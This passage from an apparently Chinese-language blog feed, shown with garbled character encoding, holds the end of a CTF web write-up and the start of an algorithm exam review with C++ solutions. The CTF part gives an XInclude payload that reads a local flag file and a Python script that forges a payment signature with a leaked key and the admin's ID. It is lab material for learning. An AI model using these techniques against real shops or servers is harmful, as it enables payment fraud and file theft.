alt="iHDW5V.md.png"></a><br>ç„¶åè¯»å–flag<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///home/fff123aggg"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>å¾—åˆ°flag{316f87681354a715d6134c4b8166aa73}</p><h2 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h2><p>è¿™ä¸ªé¢˜æ˜¯ä¸ªä»£ç å®¡è®¡çš„é¢˜ç›®ï¼Œå…ˆæŠŠæºç ç»™downä¸‹æ¥<br>æ‰“å¼€è¿™ä¸ªç½‘ç«™å‘ç°æœ‰ç™»é™†æ³¨å†ŒåŠŸèƒ½ï¼Œä»¥åŠè´­ä¹°flagçš„åŠŸèƒ½ï¼Œä½†æ˜¯è¿™é‡Œé¢è¦æƒ³å¾—åˆ°çœŸæ­£çš„flagå´éœ€è¦<code>888</code>ç§¯åˆ†æ‰å¯ä»¥è´­ä¹°ï¼Œè¿™ä¸ªæ—¶å€™å°±æ„Ÿè§‰åº”è¯¥æ˜¯è¶Šæƒè´­ä¹°flagçš„æ¼æ´äº†ã€‚ã€‚ã€‚ã€‚<br>å‘ç°æºç é‡Œé¢æœ‰æ•°æ®åº“æ–‡ä»¶æ‰“å¼€çœ‹ä¸€ä¸‹ï¼Œå‘ç°æ˜¯å­˜åœ¨ç®¡ç†å‘˜çš„ï¼Œå¹¶ä¸”idæ˜¯<code>16</code>ï¼Œè¿™ä¸ªä¸œè¥¿åæœŸæœ‰ç”¨ï¼Œè€Œä¸”ä»–æœ‰<code>30000</code>ç§¯åˆ†ï¼Œå¤Ÿä¹°å¾ˆå¤šflagäº†ï¼Œ<br><a href="https://imgchr.com/i/iHDqV1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDqV1.md.png" alt="iHDqV1.md.png"></a><br><img src="https://s1.ax1x.com/2018/11/08/iHrJRU.png" alt="iHrJRU.png"></p><p>è¿™é‡Œé¢å­¦åˆ°äº†è¯¥å¦‚ä½•å®¡è®¡pythonçš„ä»£ç ï¼Œæ„Ÿè§‰è·Ÿphpå¥—è·¯ä¸€æ ·ï¼Œè¿˜æ˜¯å¾—å…ˆå»çœ‹ä¸€ä¸‹è®¾ç½®æ–‡ä»¶å¯¹åº”å°±æ˜¯è¿™é‡Œé¢çš„<code>setting</code>æ–‡ä»¶ï¼Œ<br><a href="https://imgchr.com/i/iHrYzF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHrYzF.md.png" alt="iHrYzF.md.png"></a><br>å‘ç°é‡Œé¢æœ‰ä¸€ä¸ªç©ºçš„<code>real flag</code>åªæ˜¯å‡ºé¢˜äººæŠŠä»–ç»™åˆ æ‰äº†ï¼Œè¿™é‡Œé¢çš„é‡è¦ä¿¡æ¯å°±æ˜¯è¿™ä¸ªsecret.keyæ˜¯ç”¨äºæ„é€ ç­¾åçš„<br>å…¶å®è¿™ä¸ª<code>secret.key</code>å·²ç»ç»™äº†çš„ï¼Œä¹Ÿå­˜åœ¨äºæºç é‡Œé¢<br><a href="https://imgchr.com/i/iHrUsJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHrUsJ.md.png" alt="iHrUsJ.md.png"></a><br>ç„¶åé‡ç‚¹çœ‹<code>urls.py.</code>ä»¥åŠ<code>views.py</code>,å¦‚æœ<code>views.py</code>ä¸å­˜åœ¨<code>urls.py</code>é‡Œé¢çš„å‡½æ•°è¯´æ˜æ˜¯è°ƒç”¨äº†æ¡†æ¶è‡ªèº«è°ƒç”¨çš„å‡½æ•°ï¼Œå¯¹äºè¿™ä¸ªé¢˜è€Œè¨€æ²¡å¿…è¦å»æŸ¥çœ‹æ¡†æ¶æœ¬èº«çš„ä»£ç <br>è¿™æ®µä»£ç åœ¨æ³¨å†Œæ–¹é¢æœ¬èº«æ˜¯æ²¡æœ‰ä»»ä½•é—®é¢˜çš„ï¼Œæ‰€ä»¥å¾—çœ‹å…¶ä»–æ–¹é¢<br>å†æŸ¥çœ‹shopé‡Œé¢çš„<code>urls.py</code>ä»¥åŠ<code>views.py</code>å¯ä»¥å‘ç°é‡Œé¢å­˜åœ¨è´­ä¹°å¯¹äºèº«ä»½çš„éªŒè¯æ“ä½œ<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payOrder</span><span class="params">(request, orderid)</span>:</span></span><br><span class="line">o = get_object_or_404(Order, id=orderid, user=request.user, status=Order.ONGOING)</span><br><span class="line">form = &#123;</span><br><span class="line"><span class="string">'order_id'</span>: o.id,</span><br><span class="line"><span class="string">'buyer_id'</span>: o.user.id,</span><br><span class="line"><span class="string">'good_id'</span>: o.good.id,</span><br><span class="line"><span class="string">'buyer_point'</span>: o.user.profile.point,</span><br><span class="line"><span class="string">'good_price'</span>: o.good.price,</span><br><span class="line"><span class="string">'order_create_time'</span>: o.create_time.timestamp()</span><br><span class="line">&#125;</span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">'&amp;'</span>.join([<span class="string">f'<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> form]).encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment">#print(str2sign)</span></span><br><span class="line">sign = md5(str2sign).hexdigest()</span><br><span class="line"><span class="comment">#print(sign)</span></span><br><span class="line"><span class="keyword">return</span> render(request, <span class="string">'payment/confirm.html'</span>, &#123;<span class="string">'form'</span>: form, <span class="string">'sign'</span>: sign&#125;)</span><br></pre></td></tr></table></figure></p><p>è¿™æ®µä»£ç æœ€åæ˜¯è·³åˆ°<code>payment</code>çš„è·¯ç”±ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­è¿½è¸ªä¸€ä¸‹ï¼Œå‘ç°<code>payment</code>ä¸‹å°±ä¸€ä¸ª<code>check</code>å‡½æ•°ï¼Œå…³é”®çš„å‡½æ•°å°±åœ¨<code>views.py</code>é‡Œé¢ï¼Œè¿™é‡Œå¯¹äº¤æ˜“åšäº†è¯¦ç»†çš„æ ¡éªŒ<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkPayment</span><span class="params">(request)</span>:</span></span><br><span class="line"><span class="comment"># print(request.body)</span></span><br><span class="line">ret = &#123;<span class="string">'result'</span>: <span class="string">'æœªçŸ¥é”™è¯¯'</span>, <span class="string">'status'</span>: <span class="string">'danger'</span>&#125;</span><br><span class="line">sign = request.GET.get(<span class="string">'signature'</span>, <span class="string">''</span>)</span><br><span class="line"><span class="keyword">if</span> md5(RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + request.body).hexdigest() == sign:</span><br><span class="line">o = get_object_or_404(Order, id=request.POST.get(<span class="string">'order_id'</span>))</span><br><span class="line">g = get_object_or_404(Good, id=request.POST.get(<span class="string">'good_id'</span>))</span><br><span class="line">u = get_object_or_404(User, id=request.POST.get(<span class="string">'buyer_id'</span>))</span><br><span class="line"><span class="comment"># æ£€æŸ¥è®¢å•æ˜¯å¦ä¸ºå¾…æ”¯ä»˜çŠ¶æ€</span></span><br><span class="line"><span class="keyword">if</span> o.status != Order.ONGOING:</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">f'è®¢å• <span class="subst">&#123;o.id&#125;</span> çŠ¶æ€å¼‚å¸¸ï¼Œå¯èƒ½å·²å®Œæˆæˆ–å·²å–æ¶ˆ'</span></span><br><span class="line"><span class="comment"># æ£€æŸ¥å•†å“æ˜¯å¦å¯è´­ä¹°</span></span><br><span class="line"><span class="keyword">elif</span> g.available != <span class="keyword">True</span> <span class="keyword">or</span> g.amount &lt;= <span class="number">0</span>:</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">f'å•†å“ <span class="subst">&#123;g.id&#125;</span> æš‚æ—¶ä¸å¯è´­ä¹°ï¼Œå¯èƒ½åº“å­˜ä¸è¶³'</span></span><br><span class="line"><span class="comment"># æ£€æŸ¥ç”¨æˆ·å¯ç”¨ç§¯åˆ†æ˜¯å¦è¶³å¤Ÿ</span></span><br><span class="line"><span class="keyword">elif</span> u.profile.point &lt; g.price:</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">f'ç”¨æˆ· <span class="subst">&#123;u.username&#125;</span> å¯ç”¨ç§¯åˆ†ä¸è¶³ï¼Œæ— æ³•å®Œæˆæ”¯ä»˜'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> u.is_staff != <span class="keyword">True</span>:</span><br><span class="line">u.profile.point -= g.price</span><br><span class="line">u.save()</span><br><span class="line">g.amount -= <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> g.name == <span class="string">'FLAG'</span>:</span><br><span class="line">o.message = REAL_FLAG</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">o.message = <span class="string">f'fake_flag<span class="subst">&#123;&#123;&#123;md5(urandom(<span class="number">32</span>)).hexdigest()&#125;</span>&#125;&#125;&lt;br&gt;(è´­ä¹°â€œFLAGâ€æ‰èƒ½è·å¾—çœŸæ­£çš„ flag)'</span></span><br><span class="line"><span class="keyword">if</span> g.amount &lt;= randint(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">g.amount += randint(<span class="number">100</span>, <span class="number">200</span>)</span><br><span class="line">g.save()</span><br><span class="line">o.status = Order.FINISHED</span><br><span class="line">o.save()</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">f'è®¢å• <span class="subst">&#123;o.id&#125;</span> æ”¯ä»˜æˆåŠŸï¼'</span></span><br><span class="line">ret[<span class="string">'status'</span>] = <span class="string">'success'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ret[<span class="string">'result'</span>] = <span class="string">'ç­¾åä¸æ­£ç¡®ï¼Œæ•°æ®å¯èƒ½è¢«ç¯¡æ”¹ï¼'</span></span><br><span class="line"><span class="keyword">return</span> render(request, <span class="string">'payment/result.html'</span>, ret)</span><br></pre></td></tr></table></figure></p><p>å•†å“ä»ä¸‰æ–¹é¢è¿›è¡Œäº†æ ¡éªŒ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.æ£€æŸ¥è®¢å•æ˜¯å¦ä¸ºå¾…æ”¯ä»˜çŠ¶æ€</span><br><span class="line">2.æ£€æŸ¥å•†å“æ˜¯å¦å¯è´­ä¹°</span><br><span class="line">3.æ£€æŸ¥ç”¨æˆ·å¯ç”¨ç§¯åˆ†æ˜¯å¦è¶³å¤Ÿ</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯è¿™ä¸‰æ–¹é¢åªæ˜¯å•å•å¯¹å•†å“æ–¹åšäº†æ ¡éªŒ(è‡ªæ£€éªŒ)ï¼Œé‚£è´­ä¹°è€…å‘¢ï¼Ÿä¸å­˜åœ¨å¯¹å…¶çš„ä»»ä½•æ ¡éªŒï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰åšå¥½åŒå‘çš„æ ¡éªŒï¼Œè¿™ä¹Ÿè¯´æ˜æˆ‘ä»¬å¯ä»¥ä»ä¼ªé€ è´­ä¹°è€…çš„æ–¹é¢å»å…¥æ‰‹ï¼Œè®©åˆ«äººä»˜é’±23333</p><p>æ ¹æ®å®ƒé‡Œé¢çš„ä»£ç å»æ„é€ signatureå°±å¥½äº†<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE = <span class="string">'zhinianyuxin'</span></span><br><span class="line">form = &#123;</span><br><span class="line"><span class="string">'order_id'</span>: <span class="string">'148'</span>,</span><br><span class="line"><span class="string">'buyer_id'</span>: <span class="string">'16'</span>,   <span class="comment">#adminè´¦å·idï¼Œä»æ•°æ®åº“å¾—çŸ¥</span></span><br><span class="line"><span class="string">'good_id'</span>: <span class="string">'38'</span>,   <span class="comment"># å•†å“idä¹Ÿå¯ä»æ•°æ®åº“å¾—çŸ¥</span></span><br><span class="line"><span class="string">'buyer_point'</span>: <span class="string">'250'</span>,</span><br><span class="line"><span class="string">'good_price'</span>: <span class="string">'50'</span>,</span><br><span class="line"><span class="string">'order_create_time'</span>: <span class="string">'1541706305.953427'</span> <span class="comment">#æ—¶é—´æˆ³æ”¯ä»˜è®¢å•ä¸Šæœ‰</span></span><br><span class="line">&#125;</span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">'&amp;'</span>.join([<span class="string">f'<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> form]).encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment">#print(str2sign)</span></span><br><span class="line">sign = md5(str2sign).hexdigest()</span><br><span class="line">print(sign)</span><br></pre></td></tr></table></figure></p><p>å¾—åˆ°ç­¾åä¹‹åæŠ“æ”¯ä»˜çš„åŒ…ä¿®æ”¹å¯¹åº”å‚æ•°å‘åŒ…å³å¯<br><a href="https://imgchr.com/i/iHraL9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHraL9.md.png" alt="iHraL9.md.png"></a><br>å¾—åˆ°flag<br><a href="https://imgchr.com/i/iHr6zD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHr6zD.md.png" alt="iHr6zD.md.png"></a></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™æ¬¡æœˆèµ›å­¦åˆ°äº†å‡ ä¸ªç‚¹æ€»ç»“ä¸€ä¸‹ï¼Œç¬¬ä¸€å°±æ˜¯å­¦åˆ°PHPå‡ ä¸ªåé—¨å°å‡½æ•°ï¼Œç¬¬äºŒå°±æ˜¯ä¸€å¶é£˜é›¶å­¦é•¿å‡ºçš„é¢˜ç›®çš„ä¸€æ³¢SQLæ³¨å…¥çš„éªšæ“ä½œä»¥åŠxxeæ–‡ä»¶è¯»å–çš„æ“ä½œï¼Œç¬¬ä¸‰å°±æ˜¯æ‰§å¿µäºå¿ƒå­¦é•¿å‡ºçš„é€»è¾‘æ¼æ´çš„ä»£ç å®¡è®¡ï¼Œå¦‚ä½•å»å®¡è®¡Djangoæ¡†æ¶çš„ä»£ç ï¼Œæ€ä¹ˆå»å‘ç°æ— åŒå‘æ£€éªŒçš„logicæ¼æ´ï¼Œå¤ä¹ å»äº†2333</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ç®—æ³•ä¸Šæœºè€ƒè¯•å¤ä¹ </title>
      <link href="/algorithm-review.html"/>
      <url>/algorithm-review.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘è¦ä¸Šæœºè€ƒè¯•ï¼Œå› æ­¤è¿˜æ˜¯å¯¹ä»¥å‰åšè¿‡çš„é¢˜ç›®åšä¸€ä¸ªå¤ä¹ å›é¡¾ï¼Œè‡ªå·±é‡æ–°æ‰‹å†™ä¸€éï¼Œçº¯å±å›é¡¾ï¼Œä»£ç é£æ ¼ä¸å¥½è¯·æµ·æ¶µï¼Œè€ƒå®Œè¯•ä»¥åæˆ‘æŠŠè€ƒäº†çš„ç‚¹éƒ½æ ‡è®°äº†ä¸€ä¸‹æ–¹ä¾¿ä»¥åå­¦å¼Ÿå­¦å¦¹ä»¬å¤ä¹ äº†<a id="more"></a>ï¼Œ2333</p><h2 id="è¿­ä»£é€’å½’"><a href="#è¿­ä»£é€’å½’" class="headerlink" title="è¿­ä»£é€’å½’"></a>è¿­ä»£é€’å½’</h2><h3 id="æ±½æ°´ç“¶-è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„"><a href="#æ±½æ°´ç“¶-è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„" class="headerlink" title="æ±½æ°´ç“¶(è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„)"></a>æ±½æ°´ç“¶(è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„)</h3><h4 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>æœ‰è¿™æ ·ä¸€é“æ™ºåŠ›é¢˜ï¼šâ€œæŸå•†åº—è§„å®šï¼šä¸‰ä¸ªç©ºæ±½æ°´ç“¶å¯ä»¥æ¢ä¸€ç“¶æ±½æ°´ã€‚å°å¼ æ‰‹ä¸Šæœ‰åä¸ªç©ºæ±½æ°´ç“¶ï¼Œå¥¹æœ€å¤šå¯ä»¥æ¢å¤šå°‘ç“¶æ±½æ°´å–ï¼Ÿâ€ç­”æ¡ˆæ˜¯5ç“¶ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼šå…ˆç”¨9ä¸ªç©ºç“¶å­æ¢3ç“¶æ±½æ°´ï¼Œå–æ‰3ç“¶æ»¡çš„ï¼Œå–å®Œä»¥å4ä¸ªç©ºç“¶å­ï¼Œç”¨3ä¸ªå†æ¢ä¸€ç“¶ï¼Œå–æ‰è¿™ç“¶æ»¡çš„ï¼Œè¿™æ—¶å€™å‰©2ä¸ªç©ºç“¶å­ã€‚ç„¶åä½ è®©è€æ¿å…ˆå€Ÿç»™ä½ ä¸€ç“¶æ±½æ°´ï¼Œå–æ‰è¿™ç“¶æ»¡çš„ï¼Œå–å®Œä»¥åç”¨3ä¸ªç©ºç“¶å­æ¢ä¸€ç“¶æ»¡çš„è¿˜ç»™è€æ¿ã€‚å¦‚æœå°å¼ æ‰‹ä¸Šæœ‰nä¸ªç©ºæ±½æ°´ç“¶ï¼Œæœ€å¤šå¯ä»¥æ¢å¤šå°‘ç“¶æ±½æ°´å–ï¼Ÿ</p><h5 id="è¾“å…¥"><a href="#è¾“å…¥" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h5><p>è¾“å…¥æ–‡ä»¶æœ€å¤šåŒ…å«10ç»„æµ‹è¯•æ•°æ®ï¼Œæ¯ä¸ªæ•°æ®å ä¸€è¡Œï¼Œä»…åŒ…å«ä¸€ä¸ªæ­£æ•´æ•°n(1â‰¤nâ‰¤100)ï¼Œè¡¨ç¤ºå°å¼ æ‰‹ä¸Šçš„ç©ºæ±½æ°´ç“¶æ•°ã€‚n=0è¡¨ç¤ºè¾“å…¥ç»“æŸï¼Œä½ çš„ç¨‹åºä¸åº”å½“å¤„ç†è¿™ä¸€è¡Œã€‚</p><h5 id="è¾“å‡º"><a href="#è¾“å‡º" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h5><p>å¯¹äºæ¯ç»„æµ‹è¯•æ•°æ®ï¼Œè¾“å‡ºä¸€è¡Œï¼Œè¡¨ç¤ºæœ€å¤šå¯ä»¥å–çš„æ±½æ°´ç“¶æ•°ã€‚å¦‚æœä¸€ç“¶ä¹Ÿå–ä¸åˆ°ï¼Œè¾“å‡º 0</p><h5 id="æ ·ä¾‹è¾“å…¥"><a href="#æ ·ä¾‹è¾“å…¥" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">10</span><br><span class="line">81</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h5 id="æ ·ä¾‹è¾“å‡º"><a href="#æ ·ä¾‹è¾“å‡º" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">5</span><br><span class="line">40</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span> )<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">int</span> a,b;</span><br><span class="line"><span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(n &gt;= <span class="number">3</span>)&#123;</span><br><span class="line">a = n/<span class="number">3</span>;</span><br><span class="line">b = n%<span class="number">3</span>;</span><br><span class="line">result += a;</span><br><span class="line">n = a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( n ==<span class="number">2</span>) result += <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,result);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è·³å°é˜¶-è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„"><a href="#è·³å°é˜¶-è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„" class="headerlink" title="è·³å°é˜¶(è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„)"></a>è·³å°é˜¶(è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„)</h3><h4 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>ä¸€åªé’è›™ä¸€æ¬¡å¯ä»¥è·³ä¸Š1çº§å°é˜¶ï¼Œä¹Ÿå¯ä»¥è·³ä¸Š2çº§ã€‚æ±‚è¯¥é’è›™è·³ä¸Šä¸€ä¸ªnçº§çš„å°é˜¶æ€»å…±æœ‰å¤šå°‘ç§è·³æ³•ã€‚</p><h5 id="è¾“å…¥-1"><a href="#è¾“å…¥-1" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h5><p>å¤šç»„æµ‹è¯•æ ·ä¾‹ã€‚æ¯ç»„æµ‹è¯•æ ·ä¾‹åŒ…å«ä¸€ä¸ªæ•´æ•°nã€‚(1&lt;=n&lt;=100)</p><h5 id="è¾“å‡º-1"><a href="#è¾“å‡º-1" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h5><p>æ¯ç»„æµ‹è¯•æ ·ä¾‹è¾“å‡ºä¸€è¡Œï¼Œè¡¨ç¤ºé’è›™è·³ä¸Šnçº§å°é˜¶çš„è·³æ³•æ•°é‡.</p><p>æ‰€å¾—åˆ°çš„ç»“æœæ¨¡1000000007</p><h5 id="æ ·ä¾‹è¾“å…¥-1"><a href="#æ ·ä¾‹è¾“å…¥-1" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h5 id="æ ·ä¾‹è¾“å‡º-1"><a href="#æ ·ä¾‹è¾“å‡º-1" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">5</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> l=<span class="number">1000000007</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[<span class="number">205</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">solve_1</span><span class="params">(<span class="keyword">int</span> n )</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">long</span> <span class="keyword">long</span> count[<span class="number">205</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span>(count[n] != <span class="number">0</span> ) <span class="keyword">return</span> count[n];  <span class="comment">//è¿™é‡Œæœ‰ç‚¹åƒå¤‡å¿˜å½•æ–¹æ³•ï¼Œä¸ç„¶ç›´æ¥é€’å½’è¿™é¢˜ä¼šè¶…æ—¶</span></span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>( <span class="number">1</span> == n) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>( <span class="number">2</span> == n) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    count[n] = solve_1(n<span class="number">-1</span>)+solve_1(n<span class="number">-2</span>)%l;</span><br><span class="line">    <span class="keyword">return</span> count[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve_2</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  